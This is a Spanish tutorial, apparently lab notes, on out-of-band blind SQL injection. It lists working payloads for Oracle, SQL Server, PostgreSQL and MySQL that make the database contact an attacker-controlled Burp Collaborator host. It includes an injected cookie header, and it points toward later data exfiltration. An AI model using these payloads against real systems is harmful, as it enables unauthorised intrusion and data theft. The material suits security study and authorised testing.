### **Blind SQL Injection con Interacción Out-of-Band (OOB)**  

El ataque **Blind SQL Injection con interacción Out-of-Band (OOB)** se basa en provocar una interacción externa con un servidor controlado por el atacante (por ejemplo, un servidor DNS o HTTP), para verificar si la inyección es exitosa. A diferencia de los ataques **Boolean-Based** o **Time-Based**, en los cuales inferimos la presencia de vulnerabilidades a través de cambios en la respuesta o el tiempo de ejecución, en este caso **forzamos a la base de datos a realizar una solicitud externa**.  

Esto es útil en situaciones donde:  
✅ No hay mensajes de error visibles.  
✅ No podemos inferir datos por diferencias en la respuesta o tiempo.  
✅ La base de datos permite realizar conexiones a servidores externos.  

---

## **1. Identificación del motor de base de datos**  

Cada motor de base de datos tiene su propia manera de interactuar con el sistema operativo y realizar peticiones externas. Los siguientes payloads permiten comprobar si la base de datos es vulnerable a este tipo de ataques:  

| **Base de Datos** | **Payload** |  
|------------------|------------|  
| **Oracle** (No parcheado) | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual` |  
| **Oracle** (Parcheado, requiere privilegios elevados) | `SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |  
| **Microsoft SQL Server** | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'` |  
| **PostgreSQL** | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'` |  
| **MySQL** (Solo Windows) | `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')` |  
| **MySQL** (Solo Windows) | `SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` |  

Si la base de datos ejecuta uno de estos payloads y **observamos una interacción en nuestro servidor**, significa que el sistema es vulnerable.  

---

## **2. Configuración del servidor para recibir interacciones**  

Para comprobar si la inyección tiene éxito, necesitamos un servidor que registre las solicitudes recibidas. Podemos usar:  

- **Burp Collaborator** (recomendado): Interfaz fácil de usar para capturar solicitudes DNS y HTTP.  
- **Dnslog.cn** (alternativa online para capturar consultas DNS).  
- **Un servidor propio** con `tcpdump` o `Wireshark`.  

Si usamos Burp Suite, primero abrimos **Burp Collaborator Client** y obtenemos un subdominio como:  

```
wii7i5cutyjnasvbesehqvubv21tpmdb.oastify.com
```  

---

## **3. Ejemplo de prueba con Oracle**  

Si sospechamos que la base de datos es **Oracle**, podemos probar el siguiente payload en una cookie vulnerable:  

```
Cookie: TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//wii7i5cutyjnasvbesehqvubv21tpmdb.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--; session=TbYarrRzAFE01h8OjUj2TOhEamaTI4Ri
```  

Si la aplicación es vulnerable, **veremos la solicitud en Burp Collaborator**, confirmando que la inyección es exitosa.  

---

## **4. Explicación del payload**  

```
UNION SELECT EXTRACTVALUE(xmltype('<%3fxml version="1.0" encoding="UTF-8"%3f>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http%3a//wii7i5cutyjnasvbesehqvubv21tpmdb.oastify.com/"> %remote;]>'),'/l') FROM dual
```  

### **📌 Desglose del payload:**  

1. **`EXTRACTVALUE(xmltype(...), '/l')`**  
   - En Oracle, esta función se usa para procesar XML.  
   - Insertamos un XML malicioso que contiene una entidad externa.  

2. **`<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>`**  
   - Esto define una **entidad externa** (`%remote`) que carga un recurso desde un servidor externo.  
   - Cuando Oracle evalúa el XML, intenta cargar la URL en `SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"`.  

3. **`FROM dual`**  
   - `dual` es una tabla especial en Oracle usada para ejecutar consultas que no requieren datos de usuario.  

### **🔎 ¿Qué sucede al ejecutar este payload?**  

- Si Oracle **procesa la entidad externa**, intentará conectarse al servidor **`wii7i5cutyjnasvbesehqvubv21tpmdb.oastify.com`**.  
- En Burp Collaborator, veremos una solicitud entrante.  
- Esto confirma que **la inyección es posible** y que podemos seguir con la exfiltración de datos.  

---

## **5. Variaciones para otros motores de base de datos**  

Si el payload anterior no funciona, probamos otros dependiendo del motor:  

### **SQL Server**  

```
exec master..xp_dirtree '//wii7i5cutyjnasvbesehqvubv21tpmdb.oastify.com/a'
```  

- Ejecuta la función `xp_dirtree`, que lista directorios remotos.  
- En sistemas vulnerables, se genera una solicitud SMB al servidor del atacante.  

---

### **PostgreSQL**  

```
copy (SELECT '') to program 'nslookup wii7i5cutyjnasvbesehqvubv21tpmdb.oastify.com'
```  

- Ejecuta el comando `nslookup` en el sistema operativo.  
- Si la base de datos tiene permisos suficientes, intentará resolver el dominio, generando tráfico DNS hacia nuestro servidor.  

---

### **MySQL (Windows)**  

```
LOAD_FILE('\\\\wii7i5cutyjnasvbesehqvubv21tpmdb.oastify.com\\a')
```  

```
SELECT ... INTO OUTFILE '\\\\wii7i5cutyjnasvbesehqvubv21tpmdb.oastify.com\a'
```  

- Solo funciona en **Windows** si MySQL tiene permisos para acceder a archivos.  
- Intenta leer o escribir archivos en un recurso compartido SMB.  

---

## **6. Conclusión**  

El **Blind SQL Injection Out-of-Band** es un método poderoso para detectar vulnerabilidades cuando no hay mensajes de error ni diferencias en los tiempos de respuesta.  

### **📌 Resumen del proceso:**  

✅ **Paso 1:** Intentamos ejecutar payloads específicos para cada base de datos.  
✅ **Paso 2:** Capturamos interacciones en **Burp Collaborator** o un servidor DNS controlado.  
✅ **Paso 3:** Si hay tráfico de red, confirmamos que la inyección es posible.  
✅ **Paso 4:** Procedemos con la **exfiltración de datos** utilizando técnicas similares.  

Este método es **muy útil en entornos restringidos**, ya que evita depender de respuestas visibles o tiempos de ejecución. Una vez confirmada la vulnerabilidad, podemos avanzar a la **exfiltración completa** de datos usando el mismo canal de comunicación. 🚀
